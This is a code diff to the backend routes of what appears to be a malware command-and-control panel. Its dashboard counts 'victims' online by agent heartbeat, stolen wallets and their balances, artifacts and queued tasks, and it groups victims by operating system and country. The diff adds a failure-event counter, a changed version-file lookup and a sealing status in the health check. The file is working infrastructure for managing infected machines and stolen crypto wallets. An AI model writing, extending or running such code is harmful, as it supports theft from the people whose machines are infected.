@@ -11,6 +11,7 @@ import { bad, notFound } from '../lib/errors';
 import { requireRole } from '../plugins/auth';
 import { hashPassword, passwordPolicy } from '../lib/password';
 import { newTotpSecret, totpUri } from '../lib/totp';
+import { sealingStatus } from '../services/sealing';
 
 const LOG_DIR = process.env.LOG_DIR ?? './logs';
 
@@ -18,18 +19,19 @@ export const miscRoutes: FastifyPluginAsync = async (app) => {
   app.get('/dashboard', async () => {
     const since = new Date(Date.now() - 90_000);
     const recent = { OR: [{ lastHeartbeatAt: { gte: since } }, { lastAgentMessageAt: { gte: since } }] };
-    const [total, online, wallets, balances, artifacts, queued, byOs, byCountry] = await Promise.all([
+    const [total, online, wallets, balances, artifacts, queued, failures, byOs, byCountry] = await Promise.all([
       prisma.victim.count(),
       prisma.victim.count({ where: { ...recent, revokedAt: null } }),
       prisma.wallet.count(),
       prisma.wallet.count({ where: { NOT: { balance: null } } }),
       prisma.artifact.count({ where: { status: 'ready' } }),
       prisma.task.count({ where: { status: { in: ['queued', 'running'] } } }),
+      prisma.event.count({ where: { kind: { in: ['task_failed', 'module_degraded', 'artifact_failed', 'outbox_dropped'] }, createdAt: { gte: new Date(Date.now() - 86_400_000) } } }),
       prisma.victim.groupBy({ by: ['os'], _count: { _all: true } }),
       prisma.victim.groupBy({ by: ['country'], _count: { _all: true }, orderBy: { _count: { country: 'desc' } }, take: 8 })
     ]);
     return {
-      counters: { total, online, wallets, balances, artifacts, queued },
+      counters: { total, online, wallets, balances, artifacts, queued, failures },
       byOs: byOs.map((row) => ({ os: row.os, count: row._count._all })),
       byCountry: byCountry.map((row) => ({ country: row.country ?? 'unknown', count: row._count._all }))
     };
@@ -166,9 +168,9 @@ export const miscRoutes: FastifyPluginAsync = async (app) => {
   app.get('/versions', async () => {
     let release = process.env['SPC_RELEASE_VERSION'] ?? '';
     if (!release) {
-      for (const candidate of [join(process.cwd(), '..', 'gradle.properties'), join(process.cwd(), 'gradle.properties')]) {
+      for (const candidate of [join(process.cwd(), '..', 'version.txt'), join(process.cwd(), 'version.txt')]) {
         const text = await readFile(candidate, 'utf8').catch(() => '');
-        const match = /^mod_version=(.+)$/m.exec(text);
+        const match = /^(\d+\.\d+\.\d+)$/m.exec(text);
         if (match) {
           release = match[1]!.trim();
           break;
@@ -188,7 +190,16 @@ export const miscRoutes: FastifyPluginAsync = async (app) => {
     };
   });
 
-  app.get('/health', async () => ({ ok: true, version: 1, uptime: Math.floor(process.uptime()) }));
+  app.get('/health', async () => {
+    const sealing = await sealingStatus().catch(() => null);
+    return {
+      ok: true,
+      version: 1,
+      uptime: Math.floor(process.uptime()),
+      degraded: sealing?.degraded ?? false,
+      sealing_pending: sealing?.pending ?? null
+    };
+  });
 
   app.get('/discord/status', async () => bridgeStatus());
 
